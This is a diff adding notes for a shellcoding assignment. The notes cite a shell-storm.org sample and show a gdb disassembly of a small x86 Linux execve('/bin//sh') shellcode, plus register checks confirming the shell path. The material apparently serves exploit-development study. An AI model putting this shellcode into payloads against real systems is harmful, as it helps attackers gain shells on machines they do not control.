@@ -1,0 +1,30 @@
+Assignment-6.3 Steps
+
+Step 1:
+Original shell-storm.org Source File : http://shell-storm.org/shellcode/files/shellcode-811.php
+Original shellcode analysis (in gdb) is as below:
+
+(gdb) disassemble
+Dump of assembler code for function shellcode:
+=> 0x80002020 <+0>:     xor    eax,eax
+   0x80002022 <+2>:     push   eax
+   0x80002023 <+3>:     push   0x68732f2f
+   0x80002028 <+8>:     push   0x6e69622f
+   0x8000202d <+13>:    mov    ebx,esp
+   0x8000202f <+15>:    mov    ecx,eax
+   0x80002031 <+17>:    mov    edx,eax
+   0x80002033 <+19>:    mov    al,0xb
+   0x80002035 <+21>:    int    0x80
+   0x80002037 <+23>:    xor    eax,eax
+   0x80002039 <+25>:    inc    eax
+   0x8000203a <+26>:    int    0x80
+   0x8000203c <+28>:    add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb)
+(gdb) nexti
+0x8000202f in shellcode ()
+2: /x $ebx = 0xbffff660
+1: /x $esp = 0xbffff660
+(gdb) x/s 0xbffff660
+0xbffff660:     "/bin//sh"
+(gdb)
